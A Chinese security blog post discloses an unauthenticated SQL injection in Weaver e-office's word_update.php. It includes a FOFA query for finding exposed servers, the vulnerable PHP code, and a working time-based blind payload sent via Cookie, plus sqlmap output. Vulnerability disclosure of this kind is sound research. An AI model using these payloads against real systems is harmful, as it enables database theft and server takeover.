---
title: "泛微e-office word_update.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word_update.html
asset_dir: assets/泛微e-office-word_update.php-sql注入漏洞
---

# 泛微e-office word\_update.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/14 08:29
* 907浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

编码转换工具

服务器安全服务

云安全解决方案


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office word\_update.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

安全研究工具

企业安全咨询

网络安全会议

general/system/interface/loginedit/word\_update.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$id = $_REQUEST['divid'];
$wordcolor = $_REQUEST['wordcolor'];
$wordfont = $_REQUEST['wordfont'];
$content = $_REQUEST['content'];
$isshow = $_REQUEST['isshow'];
if ( $content == "" && $wordcolor )
{
    $query = "\r\n\t\tSELECT TEMPID,TAGDIV FROM index_div WHERE DIV_ID = {$id}\r\n\t\t";
    $re = exequery( $connection, $query );
    $ROW = mysql_fetch_array( $re );
    $TEMPID = $ROW['TEMPID'];
```

深入探索

Web安全书籍

SQL注入检测工具

编程语言教程

`divid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/system/interface/loginedit/word_update.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: divid=1 AND 3742=BENCHMARK(4000000,MD5(0x496c624d));wordcolor=5;content=
```

[![泛微e-office word_update.php sql注入漏洞](images/img-001-39cf04dfe8e9.webp)](https://image.mrxn.net/ded6a7605aa343919f96118fdfb314e1.webp)

成功在延时 4 秒

漏洞预警服务

深入探索

安全研究报告

数据库

Web安全课程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 239 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: divid=(SELECT (CASE WHEN (3387=3387) THEN 1 ELSE (SELECT 9058 UNION SELECT 6601) END))&wordcolor=5&content=

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: divid=1 AND 3742=BENCHMARK(4000000,MD5(0x496c624d))&wordcolor=5&content=
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office word\_update.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word_update.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word_update.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-system-interface-loginedit-word\_update.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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